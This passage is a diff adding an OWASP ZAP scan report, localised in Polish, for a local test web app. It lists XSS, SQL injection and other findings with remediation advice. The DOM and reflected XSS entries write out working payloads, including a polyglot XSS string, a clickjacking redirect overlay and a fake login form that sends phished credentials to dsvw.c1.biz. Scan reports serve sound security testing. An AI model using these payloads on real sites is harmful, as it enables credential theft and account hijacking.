@@ -1,0 +1,2676 @@
+<html>
+    <head>
+        <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>ZAP Scanning Report</title>
+        <style>
+body{
+  font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+  color: #000;
+  font-size: 13px;
+}
+h1{
+  text-align: center;
+  font-weight: bold;
+  font-size: 32px
+}
+h3{
+  font-size: 16px;
+}
+table{
+  border: none;
+  font-size: 13px;
+}
+td, th {
+  padding: 3px 4px;
+  word-break: break-word;
+}
+th{
+  font-weight: bold;
+}
+.results th{
+  text-align: left;
+}
+.spacer{
+  margin: 10px;
+}
+.spacer-lg{
+  margin: 40px;
+}
+.indent1{
+  padding: 4px 20px;
+}
+.indent2{
+  padding: 4px 40px;
+}
+.risk-high{
+  background-color: red;
+  color: #FFF;
+}
+.risk-medium{
+  background-color: orange;
+  color: #FFF;
+}
+.risk-low{
+  background-color: yellow;
+  color: #000;
+}
+.risk-info{
+  background-color: blue;
+  color: #FFF;
+}
+.summary th{
+  color: #FFF;
+}
+.alerts th{
+  color: #FFF;
+}
+.left-header{
+  display: inline-block;
+}
+.time-stamp{
+  float: right;
+}
+</style>
+    </head>
+    <body>
+        <h1>
+            <img src="data:image/png;base64,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">
+ZAP Scanning Report
+
+        </h1>
+        <p>
+</p>
+        <h3 class="left-header">Summary of Alerts</h3>
+        <h3 class="time-stamp">Generated on niedz., 7 lut 2021 21:12:31</h3>
+        <table width="45%" class="summary">
+            <tr bgcolor="#666666">
+                <th width="45%" height="24">Risk 
+      Level</th><th width="55%" align="center">Number 
+      of Alerts</th>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td><a href="#high">High</a></td><td align="center">6</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td><a href="#medium">Medium</a></td><td align="center">3</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td><a href="#low">Low</a></td><td align="center">5</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td><a href="#info">Informational</a></td><td align="center">3</td>
+            </tr>
+        </table>
+        <div class="spacer-lg"></div>
+        <h3>Alerts</h3>
+        <table width="75%" class="alerts">
+            <tr bgcolor="#666666">
+                <th width="60%" height="24">Name</th><th width="20%" align="center">Risk Level</th><th width="20%" align="center">Number of Instances</th>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Cross Site Scripting (DOM Based)</td><td align="center">High</td><td align="center">3</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Cross Site Scripting (Reflected)</td><td align="center">High</td><td align="center">7</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>External Redirect</td><td align="center">High</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Remote File Inclusion</td><td align="center">High</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>SQL Injection - SQLite</td><td align="center">High</td><td align="center">4</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>!pscanrules.xframeoptions.missing.name!</td><td align="center">Medium</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Przepełnienie bufora</td><td align="center">Medium</td><td align="center">5</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>X-Frame-Options Header Not Set</td><td align="center">Medium</td><td align="center">20</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>!pscanrules.xcontenttypeoptions.name!</td><td align="center">Low</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Absence of Anti-CSRF Tokens</td><td align="center">Low</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Application Error Disclosure</td><td align="center">Low</td><td align="center">7</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Private IP Disclosure</td><td align="center">Low</td><td align="center">1</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>X-Content-Type-Options Header Missing</td><td align="center">Low</td><td align="center">26</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Information Disclosure - Sensitive Information in URL</td><td align="center">Informational</td><td align="center">2</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Information Disclosure - Suspicious Comments</td><td align="center">Informational</td><td align="center">24</td>
+            </tr>
+            <tr bgcolor="#e8e8e8">
+                <td>Timestamp Disclosure - Unix</td><td align="center">Informational</td><td align="center">13</td>
+            </tr>
+        </table>
+        <div class="spacer-lg"></div>
+        <h3>Alert Detail</h3>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Medium)</th><th width="80%">Cross Site Scripting (DOM Based)</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>Cross-site Scripting (XSS) to technika ataku, kt&oacute;ra polega na odbiorze kodu dostarczonego przez osobę atakującą do instancji przeglądarki użytkownika. Przykładem przeglądarki może być standardowy klient przeglądarki internetowej lub wbudowany w oprogramowaniu obiekt wyszukiwarki taki jak przeglądarka w WinAmpie, czytniku RSS lub klient e-maila. Sam kod jest zwykle napisany w HTML/JavaScripcie, ale też rozszerzony o VBScript, ActiveX, Jave, Flasha lub jakąkolwiek inną technologię obsługującą przeglądarki.</p><p>Jeśli haker zdobędzie przeglądarkę użytkownika do wykonywania jego/jej kodu, to kod zostanie uruchomiony w kontekście(lub strefie) bezpieczeństwa hostującej strony internetowej. Z takim poziomem przywileju, kod ma możliwość czytania, modyfikowania i transmitowania jakichkolwiek dostępnych danych poprzez przeglądarkę. Użytkownik używający skrypt&oacute;w krzyżowych może zostać przejęty przez swoje konto (kradzież plik&oacute;w cookie), przeglądarka zostanie przekierowana do innej lokalizacji lub może zostać dostarczona fałszywa zawartość przez odwiedzaną witrynę internetową. Ataki typu "cross-site scripting" zasadniczo naruszają kredyt zaufania między użytkownikiem a witryną internetową. Aplikacje wykorzystujące instancje obiekt&oacute;w przeglądarki, kt&oacute;re ładują zawartość z systemu plik&oacute;w, mogą wykonywać kod zgodnie zlokalną strefą maszyny, co pozwala na naruszenie systemu.</p><p></p><p>Są trzy typy atak&oacute;w Cross-site Scripting: nieustępliwy, ustępliwy i oparty na DOM.</p><p>Ustępliwe ataki i ataki oparte na domenie DOM wymagają od użytkownika odwiedzenia specjalnie zrobionego ręcznie linku ze złośliwym kodem lub odwiedzenia złośliwej strony internetowej zawierającej formularz internetowy, kt&oacute;ry po opublikowaniu w narażonej witrynie spowoduje atak. Używanie złośliwej formy często ma miejsce, gdy narażony na atak zas&oacute;b akceptuje tylko żądania HTTP POST. W takim wypadku, forma może być podporządkowany automatycznie, bez wiedzy ofiary(n.p poprzez użycie JavaScriptu). Po kliknięciu szkodliwego linku lub przesłaniu złośliwego formularza, ładunek XSS zostanie wysłany z powrotem i zostanie zinterpretowany przez przeglądarkę użytkownika i wykonany. Inną techniką do wysyłania niemal bezwzględnych żądań(DOSTAĆ i WYSŁAĆ) jest poprzez użycie wbudowany klient, taki jak Adobe Flash.</p><p>Trwałe ataki pojawiają się kiedy złośliwy kod jest wysyłany do witryny gdzie jest przechowywany przez jakiś okres czasu. Przykłady ulubionych cel&oacute;w haker&oacute;w obejmują posty wiadomości na tablicy, maile i oprogramowanie czatu witryny. Nic nie podejrzewający użytkownik nie musi wchodzić w interakcję z żadną dodatkową witryną / linkiem (np. Stroną atakującą lub złośliwym linkiem wysłanym za pośrednictwem poczty elektronicznej), wystarczy po prostu przejrzeć stronę internetową zawierającą kod.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?domain=www.google.com#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">3</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Faza: Architektura i Projektowanie</p><p>Używaj sprawdzonej biblioteki lub struktury, kt&oacute;re nie pozwalają na wystąpienie tego osłabienia lub wprowadzają konstrukcje, kt&oacute;re sprawiają, że to osłabienie jest łatwiejsze do uniknięcia.</p><p>Przykłady bibliotek i szkielet&oacute;w, kt&oacute;re sprawiają, że łatwiej jest generować poprawnie zaszyfrowane dane wyjściowe obejmujące bibliotekę Anti-XSS microsofta, zaszyfrowany moduł ESAPI i Bramkę Apache.</p><p></p><p>Fazy: Implementacja; Architektura i Projektowanie</p><p>Zapoznaj się z kontekstem, w kt&oacute;rym będą używane twoje dane i kodowaniem, jakiego się spodziewasz. Jest to zwłaszcza ważne kiedy dane są transmitowane pomiędzy r&oacute;żnymi komponentami lub kiedy generowane są dane wyjściowe, kt&oacute;re zawierają wielokrotne szyfrowanie w tym samym czasie, tak jak strony internetowe albo kilkuczęściowe wiadomości e-mail. Zbadaj wszystkie przewidywane protokoły komunikacyjne i reprezentacje danych, aby określić wymagane strategie kodowania.</p><p>W przypadku danych, kt&oacute;re będą wysyłane na inną stronę internetową, w szczeg&oacute;lności wszelkie dane otrzymane z zewnętrznych źr&oacute;deł, należy zastosować odpowiednie kodowanie na wszystkich niealfanumerycznych znakach.</p><p>Zapoznaj się z Arkuszem Zapobiegania Oszustwa XSS, aby uzyskać więcej informacji na temat typ&oacute;w kodowania i ucieczki, kt&oacute;re są potrzebne.</p><p></p><p>Faza: Architektura i Projektowanie</p><p>W przypadku wszelkich kontroli bezpieczeństwa przeprowadzanych po stronie klienta należy upewnić się, że kontrole te są duplikowane po stronie serwera, aby uniknąć CWE-602. Hakerzy mogą obejść kontrole po stronie klienta, modyfikując wartości po przeprowadzeniu kontroli lub zmieniając klienta, aby całkowicie usunąć kontrole po stronie klienta. Następnie te zmodyfikowane wartości zostaną przesłane do serwera.</p><p></p><p>Jeśli możliwe, używaj wymodelowane mechanizmy automatycznie wymuszające oddzielenie danych i kodu. Te mechanizmy mogą być w stanie zapewnić odpowiednie cytowanie, kodowanie i sprawdzanie poprawności automatycznie, zamiast polegać na programistach, aby zapewnić tę możliwość w każdym punkcie, w kt&oacute;rym generowane są dane wyjściowe.</p><p></p><p>Faza: Implementacja</p><p>Dla każdej wygenerowanej strony internetowej użyj i określ kodowanie znak&oacute;w, takie jak ISO-8859-1 lub UTF-8. Jeśli kodowanie nie jest określone, przeglądarka internetowa może wybrać inne kodowanie, zgadując, kt&oacute;re kodowanie jest faktycznie używane na stronie internetowej. Może to spowodować, że przeglądarka traktuje określone sekwencje jako wyjątkowe, otwierając klienta na subtelne ataki XSS. Zobacz CWE-116, aby dowiedzieć się więcej o ograniczeniach związanych z kodowaniem / ucieczką.</p><p></p><p>Aby zmniejszyć ataki XSS na sesję pliku ciasteczek, ustaw plik sesji ciastecze jako HttpOnly. W przeglądarkach obsługujących funkcję HttpOnly (takich jak nowsze wersje przeglądarki Internet Explorer i Firefox) ten atrybut może uniemożliwić dostęp do pliku sesji ciasteczek użytkownika szkodliwym skryptom po stronie klienta, kt&oacute;re używają document.cookie. Nie jest to całkowite rozwiązanie, ponieważ HttpOnly nie jest obsługiwany przez wszystkie przeglądarki. Co ważniejsze, XMLHTTPRequest i inne zaawansowane technologie przeglądarek zapewniają dostęp do odczytu dla nagł&oacute;wk&oacute;w HTTP, w tym nagł&oacute;wek Set-Cookie, w kt&oacute;rym ustawiona jest flaga HttpOnly.</p><p></p><p>Zakładaj, że wszystkie dane wejściowe są szkodliwe. Używaj strategii sprawdzania danych wejściowych "akceptuj dobrze znane", np. Użyj białej listy dopuszczalnych danych wejściowych ściśle zgodnych ze specyfikacjami. Odrzucaj wszystkie dane wejściowe, kt&oacute;re nie są ściśle dopasowane ze specyfikacjami lub przeobraź je w takie, kt&oacute;re są dopasowane. Nie polegaj wyłącznie na danych wejściowych wyglądających na szkodliwe lub zdeformowane(n.p. nie polegaj na czarnej liście). Niemniej, czarne listy mogą być pomocne w wykryciu potencjalnych atak&oacute;w lub w ustaleniu kt&oacute;re dane wyjściowe są tak zdeformowane, że powinny być kategorycznie odrzucone.</p><p></p><p>Kiedy przeprowadzasz weryfikację danych wejściowych, bierz pod uwagę wszystkie potencjalnie ważne właściwości, włączając długość, pełny zasięg akceptowalnych wartości, brakujących lub dodatkowych danych wejściowych, zgodność poprzez ważne pola i dostosowanie się do zasad sprawy. Jako przykład logiki reguł transakcji, "ł&oacute;dka" może być składniowo prawidłowa, ponieważ zawiera tylko alfanumeryczne znaki, ale nie będzie poprawna jeśli oczekujesz kolor&oacute;w takich jak "czerwony" lub "niebieski".</p><p></p><p></p><p>Upewnij się, że sprawdzanie danych wejściowych odbywa się na dobrze zdefiniowanych interfejsach w aplikacji. Pomoże to chronić aplikację, nawet jeśli komponent zostanie ponownie wykorzystany lub przeniesiony gdzie indziej.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/Cross-Site-Scripting</p><p>http://cwe.mitre.org/data/definitions/79.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">79</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-high">
+                <th width="20%"><a name="high"></a>High (Medium)</th><th width="80%">Cross Site Scripting (Reflected)</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>Cross-site Scripting (XSS) to technika ataku, kt&oacute;ra polega na odbiorze kodu dostarczonego przez osobę atakującą do instancji przeglądarki użytkownika. Przykładem przeglądarki może być standardowy klient przeglądarki internetowej lub wbudowany w oprogramowaniu obiekt wyszukiwarki taki jak przeglądarka w WinAmpie, czytniku RSS lub klient e-maila. Sam kod jest zwykle napisany w HTML/JavaScripcie, ale też rozszerzony o VBScript, ActiveX, Jave, Flasha lub jakąkolwiek inną technologię obsługującą przeglądarki.</p><p>Jeśli haker zdobędzie przeglądarkę użytkownika do wykonywania jego/jej kodu, to kod zostanie uruchomiony w kontekście(lub strefie) bezpieczeństwa hostującej strony internetowej. Z takim poziomem przywileju, kod ma możliwość czytania, modyfikowania i transmitowania jakichkolwiek dostępnych danych poprzez przeglądarkę. Użytkownik używający skrypt&oacute;w krzyżowych może zostać przejęty przez swoje konto (kradzież plik&oacute;w cookie), przeglądarka zostanie przekierowana do innej lokalizacji lub może zostać dostarczona fałszywa zawartość przez odwiedzaną witrynę internetową. Ataki typu "cross-site scripting" zasadniczo naruszają kredyt zaufania między użytkownikiem a witryną internetową. Aplikacje wykorzystujące instancje obiekt&oacute;w przeglądarki, kt&oacute;re ładują zawartość z systemu plik&oacute;w, mogą wykonywać kod zgodnie zlokalną strefą maszyny, co pozwala na naruszenie systemu.</p><p></p><p>Są trzy typy atak&oacute;w Cross-site Scripting: nieustępliwy, ustępliwy i oparty na DOM.</p><p>Ustępliwe ataki i ataki oparte na domenie DOM wymagają od użytkownika odwiedzenia specjalnie zrobionego ręcznie linku ze złośliwym kodem lub odwiedzenia złośliwej strony internetowej zawierającej formularz internetowy, kt&oacute;ry po opublikowaniu w narażonej witrynie spowoduje atak. Używanie złośliwej formy często ma miejsce, gdy narażony na atak zas&oacute;b akceptuje tylko żądania HTTP POST. W takim wypadku, forma może być podporządkowany automatycznie, bez wiedzy ofiary(n.p poprzez użycie JavaScriptu). Po kliknięciu szkodliwego linku lub przesłaniu złośliwego formularza, ładunek XSS zostanie wysłany z powrotem i zostanie zinterpretowany przez przeglądarkę użytkownika i wykonany. Inną techniką do wysyłania niemal bezwzględnych żądań(DOSTAĆ i WYSŁAĆ) jest poprzez użycie wbudowany klient, taki jak Adobe Flash.</p><p>Trwałe ataki pojawiają się kiedy złośliwy kod jest wysyłany do witryny gdzie jest przechowywany przez jakiś okres czasu. Przykłady ulubionych cel&oacute;w haker&oacute;w obejmują posty wiadomości na tablicy, maile i oprogramowanie czatu witryny. Nic nie podejrzewający użytkownik nie musi wchodzić w interakcję z żadną dodatkową witryną / linkiem (np. Stroną atakującą lub złośliwym linkiem wysłanym za pośrednictwem poczty elektronicznej), wystarczy po prostu przejrzeć stronę internetową zawierającą kod.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=%3C%2Fb%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E%3Cb%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">v</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">&lt;/b&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;b&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;/b&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;b&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Attack</td><td width="80%">"&gt;&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">"&gt;&lt;script&gt;alert(1);&lt;/script&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Faza: Architektura i Projektowanie</p><p>Używaj sprawdzonej biblioteki lub struktury, kt&oacute;re nie pozwalają na wystąpienie tego osłabienia lub wprowadzają konstrukcje, kt&oacute;re sprawiają, że to osłabienie jest łatwiejsze do uniknięcia.</p><p>Przykłady bibliotek i szkielet&oacute;w, kt&oacute;re sprawiają, że łatwiej jest generować poprawnie zaszyfrowane dane wyjściowe obejmujące bibliotekę Anti-XSS microsofta, zaszyfrowany moduł ESAPI i Bramkę Apache.</p><p></p><p>Fazy: Implementacja; Architektura i Projektowanie</p><p>Zapoznaj się z kontekstem, w kt&oacute;rym będą używane twoje dane i kodowaniem, jakiego się spodziewasz. Jest to zwłaszcza ważne kiedy dane są transmitowane pomiędzy r&oacute;żnymi komponentami lub kiedy generowane są dane wyjściowe, kt&oacute;re zawierają wielokrotne szyfrowanie w tym samym czasie, tak jak strony internetowe albo kilkuczęściowe wiadomości e-mail. Zbadaj wszystkie przewidywane protokoły komunikacyjne i reprezentacje danych, aby określić wymagane strategie kodowania.</p><p>W przypadku danych, kt&oacute;re będą wysyłane na inną stronę internetową, w szczeg&oacute;lności wszelkie dane otrzymane z zewnętrznych źr&oacute;deł, należy zastosować odpowiednie kodowanie na wszystkich niealfanumerycznych znakach.</p><p>Zapoznaj się z Arkuszem Zapobiegania Oszustwa XSS, aby uzyskać więcej informacji na temat typ&oacute;w kodowania i ucieczki, kt&oacute;re są potrzebne.</p><p></p><p>Faza: Architektura i Projektowanie</p><p>W przypadku wszelkich kontroli bezpieczeństwa przeprowadzanych po stronie klienta należy upewnić się, że kontrole te są duplikowane po stronie serwera, aby uniknąć CWE-602. Hakerzy mogą obejść kontrole po stronie klienta, modyfikując wartości po przeprowadzeniu kontroli lub zmieniając klienta, aby całkowicie usunąć kontrole po stronie klienta. Następnie te zmodyfikowane wartości zostaną przesłane do serwera.</p><p></p><p>Jeśli możliwe, używaj wymodelowane mechanizmy automatycznie wymuszające oddzielenie danych i kodu. Te mechanizmy mogą być w stanie zapewnić odpowiednie cytowanie, kodowanie i sprawdzanie poprawności automatycznie, zamiast polegać na programistach, 